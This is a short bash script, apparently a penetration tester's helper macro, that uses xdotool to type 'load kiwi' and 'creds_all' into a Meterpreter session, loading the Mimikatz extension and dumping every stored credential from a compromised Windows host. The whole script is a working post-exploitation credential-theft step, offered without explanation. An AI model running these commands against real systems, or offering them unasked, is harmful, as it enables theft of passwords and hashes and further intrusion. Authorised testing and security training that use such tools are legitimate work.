#!/bin/bash

: '
meterpreter: show creds_all (mimikatz)
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "load kiwi"
xdotool key Return
sleep 1

paste_command "creds_all"
xdotool key Return
sleep 1
